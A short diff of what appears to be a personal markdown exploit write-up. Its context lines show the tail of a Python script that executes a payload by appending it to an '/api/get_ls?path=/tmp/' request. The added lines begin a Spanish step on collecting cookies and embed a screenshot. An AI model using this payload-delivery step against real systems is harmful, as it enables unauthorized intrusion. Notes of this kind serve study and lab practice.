@@ -466,3 +466,6 @@ print("Step 4 execute payload")
 step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
+`Paso-1`
+recopilar las cookies 
+![[Pasted image 20240908141951.png]]
